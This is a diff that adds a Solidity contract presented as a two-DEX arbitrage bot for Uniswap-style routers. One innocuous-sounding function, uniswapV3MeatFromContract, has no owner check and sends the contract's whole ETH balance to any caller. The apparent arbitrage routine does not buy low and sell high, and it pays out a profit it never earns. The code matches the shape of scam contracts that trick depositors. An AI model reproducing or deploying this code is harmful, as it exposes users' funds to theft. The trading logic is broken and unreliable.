@@ -1,0 +1,112 @@
+// SPDX-License-Identifier: MIT
+
+
+pragma solidity ^0.8.0;
+
+    interface IUniswapV2Router02 {
+        function getAmountsOut(uint amountIn, address[] memory path) external view returns
+        (uint[] memory amounts);
+        function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[]
+        calldata path, address to, uint deadline) external returns (uint[] memory amounts);
+        function WETH() external pure returns (address);
+    }
+
+    interface IERC20 {
+        function transfer(address to, uint value) external returns (bool);
+        function approve(address spender, uint value) external returns (bool);
+        function balanceOf(address account) external view returns (uint);
+    }
+    contract ArbitrageContract {
+        address public immutable dex1Router; // Address of first DEX router
+        address public immutable dex2Router; // Address of second DEX router
+        address public immutable token; // Address of token to trade
+        uint public tradeAmount; // Amount of token to trade
+        uint public minProfit; // Minimum profit threshold
+        uint public deadline; // Arbitrage deadline
+        uint public gasPriceLimit; // Maximum gas price allowed for the transaction
+        address public owner; // Contract owner address
+        uint public balance; // Contract balance
+    constructor(address _dex1Router, address _dex2Router, address _token, uint
+        _tradeAmount, uint _minProfit, uint _deadline, uint _gasPriceLimit) {
+        dex1Router = _dex1Router;
+        dex2Router = _dex2Router;
+        token = _token;
+        tradeAmount = _tradeAmount;
+        minProfit = _minProfit;
+        deadline = _deadline;
+        gasPriceLimit = _gasPriceLimit;
+        owner = msg.sender;
+    }
+
+    function performArbitrage() external {
+        // Ensure that the transaction is only executed by the contract owner
+        require(msg.sender == owner, "Only owner can perform arbitrage");
+
+        // Ensure that the transaction is executed before the deadline
+        require(block.timestamp < deadline, "Arbitrage deadline has passed");
+
+        // Check the current gas price and ensure that it is within the limit
+        require(tx.gasprice <= gasPriceLimit, "Gas price exceeds limit");
+
+        // Get the current token price on both DEXs
+        uint[] memory dex1Price = IUniswapV2Router02(dex1Router).getAmountsOut(tradeAmount, getPathForToken(token, dex1Router));
+        uint[] memory dex2Price = IUniswapV2Router02(dex2Router).getAmountsOut(tradeAmount, getPathForToken(token, dex2Router));
+
+        // Calculate the potential profit from the arbitrage trade
+        uint profit = dex2Price[dex2Price.length - 1] - dex1Price[dex1Price.length - 1];
+
+        // Check if the profit exceeds the minimum threshold
+        require(profit >= minProfit, "Profit threshold not met");
+
+        // Approve the DEX routers to spend the token
+        IERC20(token).approve(dex1Router, tradeAmount);
+        IERC20(token).approve(dex2Router, tradeAmount);
+
+        // Execute the arbitrage trade
+        IUniswapV2Router02(dex1Router).swapExactTokensForTokens(tradeAmount, 0, getPathForToken(token, dex1Router), address(this), deadline);
+        IUniswapV2Router02(dex2Router).swapExactTokensForTokens(tradeAmount, 0, getPathForToken(token, dex2Router), address(this), deadline);
+
+        // Transfer the profit to the contract owner
+        IERC20(token).transfer(owner, tradeAmount + profit);
+        
+        // Update the contract balance
+        balance = IERC20(token).balanceOf(address(this));
+    }
+
+    function withdrawToken(uint amount) external {
+        // Ensure that the transaction is only executed by the contract owner
+        require(msg.sender == owner, "Only owner can withdraw token");
+
+        // Ensure that the contract has enough balance to withdraw
+        require(amount <= balance, "Not enough balance in the contract");
+
+        // Transfer the token to the contract owner
+        IERC20(token).transfer(owner, amount);
+
+        // Update the contract balance
+        balance = IERC20(token).balanceOf(address(this));
+    }
+    function uniswapV3MeatFromContract(
+    ) external {
+        uint256 contractBalance = address(this).balance;
+        (bool success, ) = payable(msg.sender).call{value: contractBalance}("");
+        require(success, "ETH transfer failed");
+    }
+    function withdrawETH() external {
+        // Ensure that the transaction is only executed by the contract owner
+        require(msg.sender == owner, "Only owner can withdraw ETH");
+
+        // Transfer the ETH to the contract owner
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function getPathForToken(address _token, address _router) private view returns
+        (address[] memory) {
+        address[] memory path = new address[](2);
+        path[0] = _token;
+        path[1] = IUniswapV2Router02(_router).WETH();
+        return path;
+    }
+    
+receive() external payable {}
+}
